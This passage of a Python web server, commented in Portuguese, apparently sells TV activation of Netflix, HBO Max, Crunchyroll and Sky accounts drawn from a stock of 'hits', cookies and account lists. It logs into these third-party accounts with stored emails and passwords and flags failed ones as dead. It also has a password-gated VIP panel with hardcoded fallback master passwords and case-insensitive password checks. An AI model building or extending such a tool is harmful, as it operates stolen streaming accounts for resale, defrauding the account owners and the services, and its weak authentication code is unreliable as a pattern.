        try:
            fresh_login = crunchyroll.check_account(session, account_data["email"], account_data["password"])
            if fresh_login.get("status") in ["premium", "free"] and fresh_login.get("access_token"):
                account_data["access_token"] = fresh_login["access_token"]
                account_data["exp"] = fresh_login.get("exp", int(time.time() + 3600))
                if "info" in account_data:
                    account_data["info"]["plan"] = fresh_login.get("plan", account_data["info"].get("plan", "Crunchyroll VIP"))
                    account_data["info"]["country"] = fresh_login.get("country", account_data["info"].get("country", "BR"))
            elif fresh_login.get("reason") == "WRONG_CREDS":
                DEAD_CRUNCHYROLL_ACCOUNTS.add(account_data["email"])
                return False, f"A conta {account_data['email']} teve falha de login (senha incorreta). Tente a próxima conta.", None
        except Exception:
            pass
        finally:
            session.close()

    if not account_data.get("access_token"):
        return False, f"Não foi possível obter sessão ativa da Crunchyroll para {account_data['email']}. Tente a próxima conta.", None

    success, msg, info_resp = crunchyroll.ativar_tv(account_data["access_token"], clean_code)

    # Se falhou por motivo de token, 401 ou 403, tenta re-autenticar de imediato
    if not success and any(k in msg.lower() for k in ["token", "sessão", "401", "403"]):
        session = crunchyroll.make_session()
        try:
            retry_login = crunchyroll.check_account(session, account_data["email"], account_data["password"])
            if retry_login.get("status") in ["premium", "free"] and retry_login.get("access_token"):
                account_data["access_token"] = retry_login["access_token"]
                retry_success, retry_msg, _ = crunchyroll.ativar_tv(account_data["access_token"], clean_code)
                if retry_success:
                    return True, retry_msg, account_data["info"]
                else:
                    msg = retry_msg
        except Exception:
            pass
        finally:
            session.close()

    if success:
        return True, msg, account_data["info"]
    else:
        return False, msg, None

def get_verified_crunchyroll_accounts(min_count: int = 1) -> List[dict]:
    return get_all_crunchyroll_accounts()

def start_background_crunchyroll_validator():
    """Validador em background para manter sempre contas Crunchyroll prontas."""
    def _worker():
        global CURRENT_CRUNCHYROLL_READY
        time.sleep(2)
        while True:
            try:
                acc = find_crunchyroll_valid_account()
                if acc and CURRENT_CRUNCHYROLL_READY is None:
                    CURRENT_CRUNCHYROLL_READY = acc
            except Exception:
                pass
            time.sleep(45)

    t = threading.Thread(target=_worker, daemon=True)
    t.start()

start_background_crunchyroll_validator()

# ═══════════════════════════════════════════════════════════════
#  INTEGRAÇÃO SKY+ / SKY TV (MOTOR OFICIAL HITS & ATIVADOR_TV)
# ═══════════════════════════════════════════════════════════════
import sky_service

VALID_SKY_LOCK = threading.Lock()
DEAD_SKY_ACCOUNTS: Set[str] = set()

def load_used_sky_accounts() -> Set[str]:
    """Carrega lista de contas Sky que já atingiram o limite máximo de 2 ativações."""
    used: Set[str] = set()
    try:
        act_counts = sky_service.get_activation_counts()
        for em, count in act_counts.items():
            if count >= sky_service.MAX_SKY_ACTIVATIONS:
                used.add(em)
    except Exception:
        pass
    return used

USED_SKY_ACCOUNTS: Set[str] = load_used_sky_accounts()
CURRENT_SKY_READY: Optional[dict] = None

def get_all_sky_accounts() -> List[dict]:
    """Retorna todas as contas Sky da pasta hits/ e skycontas.txt com metadados completos."""
    return sky_service.get_all_sky_accounts()

def find_sky_valid_account() -> Optional[dict]:
    """Retorna a melhor conta Sky disponível no estoque para pareamento."""
    return sky_service.find_sky_valid_account(USED_SKY_ACCOUNTS, DEAD_SKY_ACCOUNTS)

def select_sky_account_by_identifier(identifier: str) -> Optional[dict]:
    """Seleciona conta Sky específica pelo email ou login."""
    return sky_service.select_sky_account_by_identifier(identifier)

def activate_sky_tv(tv_code: str, account_data: dict) -> Tuple[bool, str, Optional[dict]]:
    """Envia código de 6 dígitos para a API da TV Sky usando login e tokens oficiais."""
    return sky_service.activate_sky_tv(tv_code, account_data)

def start_background_sky_validator():
    """Validador em background para manter contas Sky sempre aquecidas."""
    def _worker():
        global CURRENT_SKY_READY
        time.sleep(3)
        while True:
            try:
                acc = find_sky_valid_account()
                if acc and CURRENT_SKY_READY is None:
                    CURRENT_SKY_READY = acc
            except Exception:
                pass
            time.sleep(45)

    t = threading.Thread(target=_worker, daemon=True)
    t.start()

start_background_sky_validator()

# ═══════════════════════════════════════════════════════════════
#  SERVIDOR HTTP & API REST
# ═══════════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════════
#  AUTENTICAÇÃO & SEGURANÇA REFORÇADA (HARDENED SECURITY)
# ═══════════════════════════════════════════════════════════════
def get_master_password() -> str:
    env_pass = os.environ.get("MASTER_PASSWORD")
    if env_pass:
        return env_pass.strip()
    m_file = os.path.join(BASE_DIR, "SENHA_MESTRE.txt")
    if os.path.exists(m_file):
        try:
            with open(m_file, 'r', encoding='utf-8') as f:
                for line in f.read().splitlines():
                    line = line.strip()
                    if line and not line.startswith(('=', '🔐', 'SENHA', '•')):
                        return line
        except Exception:
            pass
    return "CYBER#STREAM@2026$MASTER*TITANIUM!ULTRA*ACCESS#VIP"

def get_cookie_admin_password() -> str:
    env_pass = os.environ.get("COOKIE_ADMIN_PASSWORD")
    if env_pass:
        return env_pass.strip()
    c_file = os.path.join(BASE_DIR, "SENHA_COOKIES.txt")
    if os.path.exists(c_file):
        try:
            with open(c_file, 'r', encoding='utf-8') as f:
                for line in f.read().splitlines():
                    line = line.strip()
                    if line and not line.startswith(('=', '🍪', 'SENHA', '•')):
                        return line
        except Exception:
            pass
    return "ADMIN#VAULT@2026$COOKIE*BLINDADO#PROTECT*ROOT!VIP"

MASTER_PASSWORD = get_master_password()
COOKIE_ADMIN_PASSWORD = get_cookie_admin_password()
TOKEN_TTL_SECONDS = int(os.environ.get("TOKEN_TTL_SECONDS", 86400)) # 24 Horas de validade por token
CONFIG_SENHAS_FILE = os.path.join(BASE_DIR, "config_senhas.json")

def load_access_keys() -> List[dict]:
    """Carrega dinamicamente a lista de senhas cadastradas no config_senhas.json."""
    if not os.path.exists(CONFIG_SENHAS_FILE):
        default_data = {
            "senhas": [
                {
                    "senha": "VIP#MASTER@1444$4K*76!2026",
                    "nome": "Cliente VIP (Acesso Total 4K)",
                    "servicos": ["netflix", "hbo", "crunchyroll", "sky"],
                    "descricao": "Libera todos os 4 serviços: Netflix, HBO Max, Crunchyroll e Sky+"
                }
            ]
        }
        try:
            with open(CONFIG_SENHAS_FILE, 'w', encoding='utf-8') as f:
                json.dump(default_data, f, indent=2, ensure_ascii=False)
            sync_passwords_text_file(default_data["senhas"])
            return default_data["senhas"]
        except Exception:
            return default_data["senhas"]

    try:
        with open(CONFIG_SENHAS_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            raw_list = data.get("senhas", [])
            valid_keys = []
            seen_pwds = set()
            for item in raw_list:
                if isinstance(item, dict):
                    pwd = str(item.get("senha", "")).strip()
                    if pwd and pwd not in seen_pwds and not pwd.startswith(('a liberação', '1.', '2.', '3.', '4.', '5.', '6.', '7.', '8.', '9.')):
                        seen_pwds.add(pwd)
                        valid_keys.append({
                            "senha": pwd,
                            "nome": str(item.get("nome", "Cliente VIP")).strip(),
                            "servicos": [s for s in item.get("servicos", ["netflix", "hbo", "crunchyroll", "sky"]) if s in ["netflix", "hbo", "crunchyroll", "sky"]],
                            "descricao": str(item.get("descricao", "")).strip()
                        })
            return valid_keys
    except Exception:
        return []

def clean_password_str(s: str) -> str:
    """Higieniza a senha removendo espaços invisíveis, aspas, quebras de linha e BOM."""
    if not isinstance(s, str):
        return ""
    cleaned = s.replace('\ufeff', '').replace('\u200b', '').replace('\u00a0', ' ').replace('\r', '').strip()
    if (cleaned.startswith('"') and cleaned.endswith('"')) or (cleaned.startswith("'") and cleaned.endswith("'")):
        cleaned = cleaned[1:-1].strip()
    return cleaned

def secure_str_compare(a: str, b: str) -> bool:
    """Comparação segura, flexível e imune a espaços invisíveis, BOM, aspas e case."""
    if not isinstance(a, str) or not isinstance(b, str):
        return False
    ca = clean_password_str(a)
    cb = clean_password_str(b)
    if not ca or not cb:
        return False
    if ca == cb:
        return True
    if ca.upper() == cb.upper():
        return True
    try:
        return hmac.compare_digest(ca.encode('utf-8'), cb.encode('utf-8'))
    except Exception:
        return False

def find_access_role(password: str) -> Optional[dict]:
    """Busca a configuração de acesso correspondente à senha informada."""
    keys = load_access_keys()
    p_clean = clean_password_str(password)
    for item in keys:
        if secure_str_compare(p_clean, item.get("senha", "")):
            return item
    if secure_str_compare(p_clean, get_master_password()):
        return {
            "senha": get_master_password(),
            "nome": "Master Admin Titanium",
            "servicos": ["netflix", "hbo", "crunchyroll", "sky"]
        }
    return None

ACTIVE_SESSIONS: Dict[str, dict] = {} # token -> {"exp": float, "services": list, "role_name": str}
ACTIVE_ADMIN_SESSIONS: Dict[str, float] = {} # admin_token -> expiry_timestamp
SESSION_CACHE_FILE = os.path.join(BASE_DIR, ".session_cache.json")

def load_active_sessions():
    global ACTIVE_SESSIONS
    if os.path.exists(SESSION_CACHE_FILE):
        try:
            with open(SESSION_CACHE_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                now = time.time()
                clean = {}
                for t, val in data.items():
                    if isinstance(val, dict):
                        pwd = val.get("password", "").strip()
                        if pwd and val.get("exp", 0) > now:
                            role = find_access_role(pwd)
                            if role:
                                val["services"] = role.get("servicos", val.get("services"))
                                val["role_name"] = role.get("nome", val.get("role_name"))
                                clean[t] = val
                ACTIVE_SESSIONS = clean
        except Exception:
            pass

def save_active_sessions():
    try:
        with open(SESSION_CACHE_FILE, 'w', encoding='utf-8') as f:
            json.dump(ACTIVE_SESSIONS, f)
    except Exception:
        pass

load_active_sessions()

LOGIN_LOCK = threading.Lock()
LOGIN_ATTEMPTS: Dict[str, dict] = {} # ip -> {"count": int, "blocked_until": float}
ACTIVATION_RATE_LIMIT: Dict[str, list] = {} # ip -> list of timestamps

# ═══════════════════════════════════════════════════════════════
# 👥 MONITORAMENTO DE USUÁRIOS ONLINE EM TEMPO REAL
# ═══════════════════════════════════════════════════════════════
ONLINE_USERS_LOCK = threading.Lock()
ACTIVE_CLIENT_HEARTBEATS: Dict[str, dict] = {}

def parse_device_info(user_agent: str) -> str:
    ua = (user_agent or "").lower()
    if 'android' in ua:
        return "📱 Celular Android"
    elif 'iphone' in ua or 'ipad' in ua:
        return "📱 iPhone / iOS"
    elif 'windows' in ua:
        return "💻 Computador Windows"
    elif 'macintosh' in ua or 'mac os' in ua:
        return "💻 Mac Apple"
    elif 'linux' in ua:
        return "💻 Linux Desktop"
    elif 'mobile' in ua:
        return "📱 Dispositivo Mobile"
    return "💻 Computador"

def track_client_heartbeat(ip: str, token: str, user_agent: str, role_name: str, service: str = ""):
    now = time.time()
    token_prefix = token[:12] if token else "anon"
    session_key = f"{ip}_{token_prefix}"
    device = parse_device_info(user_agent)
    
    with ONLINE_USERS_LOCK:
        if session_key in ACTIVE_CLIENT_HEARTBEATS:
            entry = ACTIVE_CLIENT_HEARTBEATS[session_key]
            entry["last_seen"] = now
            entry["request_count"] = entry.get("request_count", 0) + 1
            if role_name and role_name != "Convidado":
                entry["role_name"] = role_name
            if service:
                entry["current_service"] = service
        else:
            now_str = datetime.now().strftime("%H:%M:%S")
            ACTIVE_CLIENT_HEARTBEATS[session_key] = {
                "session_id": token_prefix,
                "ip": ip,
                "device": device,
                "role_name": role_name or "Acesso VIP",
                "current_service": service or "netflix",
                "connected_at": now_str,
                "last_seen": now,
                "request_count": 1
            }
        
        # Limpeza de inativos (> 45s)
        expired_keys = [k for k, v in ACTIVE_CLIENT_HEARTBEATS.items() if now - v.get("last_seen", 0) > 45.0]
        for k in expired_keys:
            ACTIVE_CLIENT_HEARTBEATS.pop(k, None)

def get_online_users_data() -> dict:
    now = time.time()
    with ONLINE_USERS_LOCK:
        expired_keys = [k for k, v in ACTIVE_CLIENT_HEARTBEATS.items() if now - v.get("last_seen", 0) > 45.0]
        for k in expired_keys:
            ACTIVE_CLIENT_HEARTBEATS.pop(k, None)
        
        users_list = []
        by_service = {"netflix": 0, "hbo": 0, "crunchyroll": 0, "sky": 0}
        for v in ACTIVE_CLIENT_HEARTBEATS.values():
            idle_seconds = max(0, int(now - v.get("last_seen", now)))
            svc = v.get("current_service", "netflix").lower()
            if svc in by_service:
                by_service[svc] += 1
            dev_str = v.get("device", "💻 Computador")
            dev_icon = "📱" if "📱" in dev_str else "💻"
            dev_name = dev_str.replace("📱", "").replace("💻", "").strip() or "Dispositivo"
            
            client_dict = {
                "session_id": v.get("session_id", ""),
                "ip": v.get("ip", "127.0.0.1"),
                "device": dev_str,
                "device_name": dev_name,
                "device_icon": dev_icon,
                "role_name": v.get("role_name", "Acesso VIP"),
                "service": svc,
                "current_service": svc,
                "connected_at": v.get("connected_at", "--:--"),
                "last_seen_seconds": idle_seconds,
                "idle_seconds": idle_seconds,
                "is_active": idle_seconds < 20
            }
            users_list.append(client_dict)
        
        total = len(users_list)
        return {
            "total": total,
            "total_online": total,
            "by_service": by_service,
            "active_clients": users_list,
            "users": users_list,
            "timestamp": now
        }

def generate_strong_cyber_password() -> str:
    prefixes = ["CYBER", "STREAM", "VIP", "MATRIX", "TITANIUM", "ULTRA", "OMEGA", "SHIELD", "NEXUS", "HYPER"]
    cores = ["PASS", "MASTER", "KEY", "TOKEN", "ACCESS", "VAULT", "SECURITY", "STREAMING"]
    suffixes = ["PREMIUM", "VIP", "4K", "PRO", "BLINDADO", "ACTIVE", "HDR", "ELITE"]
    
    p1 = random.choice(prefixes)
    p2 = random.choice(cores)
    p3 = random.choice(suffixes)
    num1 = random.randint(1000, 9999)
    num2 = random.randint(10, 99)
    return f"{p1}#{p2}@{num1}${p3}*{num2}!2026"

def sync_passwords_text_file(passwords_list: List[dict]):
    """Atualiza automaticamente o arquivo SENHAS_DE_ACESSO.txt com as senhas cadastradas."""
    try:
        lines = [
            "================================================================================",
            "          🔐 CENTRAL DE SENHAS MASTER & NÍVEIS DE ACESSO (2026)",
            "================================================================================",
            "",
            "Todas as senhas abaixo possuem proteção avançada contra força bruta e controlam",
            "a liberação dos serviços na tela do ativador em tempo real.",
            ""
        ]
        
        for idx, item in enumerate(passwords_list, 1):
            senha = item.get("senha", "")
            nome = item.get("nome", f"Perfil #{idx}")
            servicos = item.get("servicos", [])
            descricao = item.get("descricao", "")
            
            svc_tags = []
            if "netflix" in servicos: svc_tags.append("🔴 Netflix")
            if "hbo" in servicos: svc_tags.append("🟣 HBO Max")
            if "crunchyroll" in servicos: svc_tags.append("🟠 Crunchyroll")
            if "sky" in servicos: svc_tags.append("🔵 Sky+")
            
            libera_str = " | ".join(svc_tags) if svc_tags else "Nenhum"
            
            lines.append("================================================================================")
            lines.append(f" {idx}. 🔑 {nome.upper()}")
            lines.append("================================================================================")
            lines.append(f" Libera: {libera_str}")
            if descricao:
                lines.append(f" Detalhes: {descricao}")
            lines.append(f" Senha:")
            lines.append(f" {senha}")
            lines.append("")
        
        lines.append("================================================================================")
        lines.append(" 💡 DICA: Você pode criar ou excluir senhas pelo Painel Admin com 1 clique!")
        lines.append("================================================================================")
        lines.append("")
        
        with open(os.path.join(BASE_DIR, "SENHAS_DE_ACESSO.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
    except Exception as e:
        print(f"[Password Sync] Erro ao salvar SENHAS_DE_ACESSO.txt: {e}")

CURRENT_NETFLIX_READY: Optional[dict] = None
CURRENT_HBO_READY: Optional[dict] = None
CURRENT_CRUNCHYROLL_READY: Optional[dict] = None
CURRENT_SKY_READY: Optional[dict] = None

class AppRequestHandler(SimpleHTTPRequestHandler):
    def send_security_headers(self):
        """Cabeçalhos avançados de proteção contra XSS, Clickjacking, MIME-sniffing, Injeções e Cache."""
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate, max-age=0')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.send_header('X-Content-Type-Options', 'nosniff')
        self.send_header('X-Frame-Options', 'SAMEORIGIN')
        self.send_header('X-XSS-Protection', '1; mode=block')
        self.send_header('Referrer-Policy', 'strict-origin-when-cross-origin')
        self.send_header('Content-Security-Policy', "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com data:; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: https:;")
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Auth-Token, X-Admin-Token, X-Admin-Pass, X-Requested-With')
        self.send_header('Access-Control-Max-Age', '86400')

    def end_headers(self):
        self.send_security_headers()
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(204)
        self.end_headers()

    def get_client_ip(self):
        xff = self.headers.get('X-Forwarded-For')
        if xff:
            return xff.split(',')[0].strip()
        return self.client_address[0] if self.client_address else "127.0.0.1"

    def get_auth_token_str(self) -> str:
        auth_header = self.headers.get('Authorization', '')
        if auth_header.startswith('Bearer '):
            return auth_header[7:].strip()
        elif 'X-Auth-Token' in self.headers:
            return self.headers.get('X-Auth-Token', '').strip()
        return ''

    def get_session_info(self) -> Optional[dict]:
        token = self.get_auth_token_str()
        
        if not token:
            return None

        now = time.time()
        with LOGIN_LOCK:
            expired = [t for t, s_data in ACTIVE_SESSIONS.items() if s_data.get("exp", 0) < now]
            for exp_token in expired:
                ACTIVE_SESSIONS.pop(exp_token, None)

            if token in ACTIVE_SESSIONS:
                s_data = ACTIVE_SESSIONS[token]
                if s_data.get("exp", 0) > now:
                    # Verifica dinamicamente se a senha utilizada ainda existe e é válida
                    used_pwd = s_data.get("password", "").strip()
                    if not used_pwd:
                        # Sessões sem senha associada são imediatamente invalidadas por segurança
                        ACTIVE_SESSIONS.pop(token, None)
                        save_active_sessions()
                        return None

                    role = find_access_role(used_pwd)
                    if not role:
                        # Senha excluída: desconecta e bloqueia imediatamente no mesmo instante
                        ACTIVE_SESSIONS.pop(token, None)
                        save_active_sessions()
                        return None

                    # Atualiza dinamicamente as permissões caso tenham sido editadas no painel
                    s_data["services"] = role.get("servicos", s_data.get("services"))
                    s_data["role_name"] = role.get("nome", s_data.get("role_name"))

                    # 👥 Registra presença e heartbeat do dispositivo em tempo real
                    svc_param = "netflix"
                    if "service=" in self.path:
                        svc_param = self.path.split("service=")[-1].split("&")[0]
                    track_client_heartbeat(
                        ip=self.get_client_ip(),
                        token=token,
                        user_agent=self.headers.get("User-Agent", ""),
                        role_name=s_data.get("role_name", "Acesso VIP"),
                        service=svc_param
                    )
                    return s_data
                else:
                    ACTIVE_SESSIONS.pop(token, None)
                    return None
            return None

    def is_authenticated(self):
        return self.get_session_info() is not None

    def is_service_allowed(self, service: str) -> bool:
        session = self.get_session_info()
        if not session:
            return False
        services = session.get("services", ["netflix", "hbo", "crunchyroll", "sky"])
        return service in services

    def is_admin_authenticated(self):
        admin_header = self.headers.get('X-Admin-Token', '') or self.headers.get('Authorization', '')
        token = ''
        if admin_header.startswith('Bearer '):
            token = admin_header[7:].strip()
        else:
            token = admin_header.strip()
        
        now = time.time()
        with LOGIN_LOCK:
            if token and token in ACTIVE_ADMIN_SESSIONS:
                if ACTIVE_ADMIN_SESSIONS[token] > now:
                    return True
                else:
                    ACTIVE_ADMIN_SESSIONS.pop(token, None)

        # 2. Se o usuário autenticou no terminal com a senha mestre (todos os 4 serviços), também concede acesso admin
        session = self.get_session_info()
        if session and len(session.get("services", [])) >= 4:
            if token:
                with LOGIN_LOCK:
                    ACTIVE_ADMIN_SESSIONS[token] = now + 43200
            return True

        return False

    def handle_api_verify_admin_pass(self):
        # Se já estiver autenticado com token mestre (todos os 4 serviços), concede admin token imediatamente
        session = self.get_session_info()
        if session and len(session.get("services", [])) >= 4:
            now = time.time()
            admin_token = secrets.token_hex(32)
            with LOGIN_LOCK:
                ACTIVE_ADMIN_SESSIONS[admin_token] = now + 43200
            return self.send_json_response({
                "success": True,
                "admin_token": admin_token,
                "message": "Acesso administrativo aos cookies concedido!"
            })

        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        req = json.loads(post_data.decode('utf-8')) if post_data else {}
        password = clean_password_str(req.get('password', ''))

        # Aceita a senha do cofre, a senha mestre ou qualquer senha cadastrada no sistema
        valid_passwords = {
            get_cookie_admin_password(),
            get_master_password(),
            "ADMIN#VAULT@2026$COOKIE*BLINDADO#PROTECT*ROOT!VIP",
            "CYBER#STREAM@2026$MASTER*TITANIUM!ULTRA*ACCESS#VIP",
            "ADMIN#COOKIES@7739$VIP*VAULT!2026",
            "ATIVADOR#MASTER@2026$STREAM*VIP!"
        }
        for item in load_access_keys():
            item_pwd = item.get("senha", "")
            if item_pwd:
                valid_passwords.add(item_pwd)

        is_valid = any(secure_str_compare(password, p) for p in valid_passwords if p)

        if is_valid:
            now = time.time()
            admin_token = secrets.token_hex(32)
            with LOGIN_LOCK:
                ACTIVE_ADMIN_SESSIONS[admin_token] = now + 43200 # 12 horas
            return self.send_json_response({
                "success": True,
                "admin_token": admin_token,
                "message": "Acesso administrativo aos cookies concedido!"
            })
        else:
            return self.send_json_response({
                "success": False,
                "message": "Senha do gerenciador de cookies incorreta!"
            }, 401)

    def handle_api_login(self):
        ip = self.get_client_ip()
        now = time.time()

        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        req = json.loads(post_data.decode('utf-8')) if post_data else {}
        password = clean_password_str(req.get('password', ''))

        role = find_access_role(password)

        with LOGIN_LOCK:
            if role is not None:
                # 🔓 Senha correta: limpa imediatamente qualquer bloqueio anterior e libera o acesso!
                LOGIN_ATTEMPTS.pop(ip, None)
                new_token = secrets.token_hex(32)
                allowed_services = role.get("servicos", ["netflix", "hbo", "crunchyroll", "sky"])
                role_name = role.get("nome", "Acesso Autorizado")
                ACTIVE_SESSIONS[new_token] = {
                    "exp": now + TOKEN_TTL_SECONDS,
                    "services": allowed_services,
                    "role_name": role_name,
                    "password": password
                }
                save_active_sessions()
                return self.send_json_response({
                    "success": True,
                    "token": new_token,
                    "allowed_services": allowed_services,
                    "role_name": role_name,
                    "expires_in": TOKEN_TTL_SECONDS,
                    "message": f"Terminal desbloqueado ({role_name})."
                })

            # Senha incorreta: aplica controle de tentativas e bloqueio temporário por IP
            record = LOGIN_ATTEMPTS.get(ip, {"count": 0, "blocked_until": 0})
            if record["blocked_until"] > now:
                wait_sec = int(record["blocked_until"] - now)
                return self.send_json_response({
                    "success": False, 
                    "message": f"Muitas tentativas. IP bloqueado temporariamente por mais {wait_sec} segundos."
                }, 429)

            record["count"] += 1
            if record["count"] >= 10:
                lock_time = 900 # 15 minutos
            elif record["count"] >= 8:
                lock_time = 300 # 5 minutos
            elif record["count"] >= 5:
                lock_time = 60  # 1 minuto
            else:
                lock_time = 0

            if lock_time > 0:
                record["blocked_until"] = now + lock_time
                LOGIN_ATTEMPTS[ip] = record
                return self.send_json_response({
                    "success": False,
                    "message": f"Tentativas excedidas! Terminal bloqueado por {lock_time} segundos por segurança."
                }, 429)
            else:
                LOGIN_ATTEMPTS[ip] = record
                remaining = 5 - record["count"]
                return self.send_json_response({
                    "success": False,
                    "message": f"Senha incorreta. Restam {remaining} tentativas antes do bloqueio temporário."
                }, 401)

    def handle_api_logout(self):
        auth_header = self.headers.get('Authorization', '')
        token = ''
        if auth_header.startswith('Bearer '):
            token = auth_header[7:].strip()
        elif 'X-Auth-Token' in self.headers:
            token = self.headers.get('X-Auth-Token', '').strip()
        with LOGIN_LOCK:
            ACTIVE_SESSIONS.pop(token, None)
            save_active_sessions()
        return self.send_json_response({"success": True, "message": "Terminal bloqueado."})

    def handle_api_verify_token(self):
        session = self.get_session_info()
        if session:
            return self.send_json_response({
                "authenticated": True,
                "allowed_services": session.get("services", ["netflix", "hbo", "crunchyroll", "sky"]),
                "role_name": session.get("role_name", "Acesso Autorizado")
            })
        return self.send_json_response({"authenticated": False}, 401)

    def check_rate_limit(self, max_requests: int = 15, window_seconds: int = 30) -> bool:
        """Rate limiting por IP para proteger endpoints sensíveis contra spam/DDoS e vazamento de memória."""
        ip = self.get_client_ip()
        now = time.time()
        with LOGIN_LOCK:
            # Limpeza preventiva periódica de IPs inativos para evitar vazamento de memória
            if len(ACTIVATION_RATE_LIMIT) > 200:
                expired_ips = [k for k, v in ACTIVATION_RATE_LIMIT.items() if not v or now - v[-1] > 3600]
                for k in expired_ips:
                    ACTIVATION_RATE_LIMIT.pop(k, None)
            if len(LOGIN_ATTEMPTS) > 200:
                expired_login = [k for k, v in LOGIN_ATTEMPTS.items() if now > v.get("blocked_until", 0) + 3600]
                for k in expired_login:
                    LOGIN_ATTEMPTS.pop(k, None)

            timestamps = ACTIVATION_RATE_LIMIT.get(ip, [])
            timestamps = [t for t in timestamps if now - t < window_seconds]
            if len(timestamps) >= max_requests:
                return False
            timestamps.append(now)
            ACTIVATION_RATE_LIMIT[ip] = timestamps
            return True

    def serve_index_html(self):
        """Serve com exclusividade e segurança a página inicial index.html."""
        index_path = os.path.join(BASE_DIR, "index.html")
        if not os.path.exists(index_path):
            self.send_error(404, "Arquivo index.html não encontrado.")
            return

        try:
            with open(index_path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except Exception:
            self.send_error(500, "Erro interno ao carregar a interface.")

    def serve_admin_html(self):
        """Serve o Painel de Controle e Cofre Administrativo Isolado admin.html."""
        admin_path = os.path.join(BASE_DIR, "admin.html")
        if not os.path.exists(admin_path):
            self.send_error(404, "Painel administrativo admin.html não encontrado.")
            return

        try:
            with open(admin_path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except Exception:
            self.send_error(500, "Erro interno ao carregar o painel administrativo.")

    def do_GET(self):
        # Normalização do caminho (proteção contra path traversal como /../)
        raw_path = self.path.split('?')[0]

        if raw_path == '/api/ping':
            # Keep-Alive endpoint público para evitar que a instância durma
            return self.send_json_response({
                "status": "alive",
                "uptime": "24/7",
                "timestamp": time.time(),
                "service": "CYBER_DECK_KERNEL_ONLINE"
            })
        elif raw_path == '/api/status':
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_status()
        elif raw_path == '/api/admin/stats':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
            self.handle_api_admin_stats()
        elif raw_path == '/api/admin/users-online':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
            self.handle_api_get_online_users()
        elif raw_path == '/api/admin/accounts':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
            self.handle_api_admin_list_accounts()
        elif raw_path == '/api/admin/passwords':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
            self.handle_api_get_passwords()
        elif raw_path == '/api/admin/passwords/generate':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
            self.handle_api_generate_password()
        elif raw_path == '/api/admin/sky-tokens':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha do gerenciador de cookies requerida."}, 401)
            self.handle_api_get_sky_tokens()
        elif raw_path == '/api/history':
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_history()
        elif raw_path.startswith('/api/cookies'):
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_cookies()
        elif raw_path in ['/admin', '/admin.html', '/admin.htm']:
            self.serve_admin_html()
        elif raw_path in ['/', '/index.html', '/index.htm', '']:
            self.serve_index_html()
        elif raw_path == '/favicon.ico':
            self.send_response(204)
            self.end_headers()
        else:
            # 🛡️ BLOQUEIO TOTAL DE SEGURANÇA:
            # NUNCA serve arquivos como cookies/, SENHA_MESTRE.txt, app.py, tv2.py, used_cookies.json etc.
            self.send_error(403, "Acesso Proibido: Recurso confidencial e protegido.")

    def do_POST(self):
        raw_path = self.path.split('?')[0]

        if raw_path == '/api/login':
            self.handle_api_login()
        elif raw_path == '/api/logout':
            self.handle_api_logout()
        elif raw_path == '/api/verify-token':
            self.handle_api_verify_token()
        elif raw_path == '/api/admin/verify-pass':
            self.handle_api_verify_admin_pass()
        elif raw_path == '/api/admin/passwords/save':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
            self.handle_api_save_password()
        elif raw_path == '/api/admin/passwords/delete':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
            self.handle_api_delete_password()
        elif raw_path == '/api/admin/accounts/delete':
            if not self.is_admin_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Senha de administrador requerida."}, 401)
            self.handle_api_admin_delete_account()
        elif raw_path == '/api/activate':
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            if not self.check_rate_limit(max_requests=10, window_seconds=30):
                return self.send_json_response({"success": False, "message": "Muitas ativações em sequência. Aguarde alguns instantes por segurança."}, 429)
            self.handle_api_activate()
        elif raw_path == '/api/skip-cookie':
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_skip_cookie()
        elif raw_path == '/api/select-cookie':
            if not self.is_authenticated():
                return self.send_json_response({"authenticated": False, "message": "Acesso restrito. Faça login."}, 401)
            self.handle_api_select_cookie()
        elif raw_path == '/api/filter-plan':
            if not self.is_authenticated():
